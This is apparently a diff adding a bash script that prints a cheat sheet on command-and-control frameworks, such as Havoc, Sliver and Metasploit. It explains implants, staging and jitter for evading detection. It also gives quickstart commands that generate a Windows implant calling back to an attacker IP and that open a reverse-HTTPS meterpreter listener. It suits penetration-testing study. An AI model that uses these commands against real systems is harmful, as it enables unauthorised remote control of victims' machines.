@@ -1,0 +1,55 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── C2 FRAMEWORKS ────────────────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Key Concepts ─────────────────────────────────────${NC}"
+echo -e "  ${GREEN}Listener${NC}        # server waiting for implant check-ins"
+echo -e "  ${GREEN}Implant${NC}         # payload on victim (beacon/agent/stager)"
+echo -e "  ${GREEN}Staging${NC}         # small stager downloads full implant"
+echo -e "  ${GREEN}Stageless${NC}       # full implant in one payload"
+echo -e "  ${GREEN}Sleep${NC}           # check-in interval (longer = stealthier)"
+echo -e "  ${GREEN}Jitter${NC}          # randomize sleep to avoid detection"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Frameworks Comparison ────────────────────────────${NC}"
+echo -e "  ${GREEN}Metasploit${NC}      # built-in, easiest — well-known to AV"
+echo -e "  ${GREEN}Havoc${NC}           # modern, evasive, free — github.com/HavocFramework/Havoc"
+echo -e "  ${GREEN}Sliver${NC}          # Go-based, free — github.com/BishopFox/sliver"
+echo -e "  ${GREEN}Covenant${NC}        # .NET/C# implants — github.com/cobbr/Covenant"
+echo -e "  ${GREEN}Cobalt Strike${NC}   # industry standard, paid (\$3500/yr)"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Havoc Quickstart ─────────────────────────────────${NC}"
+echo -e "  Note: Server:"
+echo -e "  ${GREEN}./havoc server --profile ./profiles/havoc.yaotl${NC}"
+echo -e "  Note: Client:"
+echo -e "  ${GREEN}./havoc client${NC}"
+echo -e "  Note: Generate implant: Payloads -> Windows Shellcode/EXE"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Sliver Quickstart ────────────────────────────────${NC}"
+echo -e "  ${GREEN}sliver-server${NC}"
+echo -e "  ${GREEN}sliver > generate --mtls <KALI_IP> --os windows --save /tmp/implant.exe${NC}"
+echo -e "  ${GREEN}sliver > mtls --lport 8888${NC}"
+echo -e "  ${GREEN}sliver > sessions${NC}"
+echo -e "  ${GREEN}sliver > use <session_id>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Metasploit (C2-mode) ─────────────────────────────${NC}"
+echo -e "  ${GREEN}msfconsole -q${NC}"
+echo -e "  ${GREEN}use exploit/multi/handler${NC}"
+echo -e "  ${GREEN}set payload windows/x64/meterpreter/reverse_https${NC}"
+echo -e "  ${GREEN}set LHOST tun0; set LPORT 443${NC}"
+echo -e "  ${GREEN}exploit -j${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
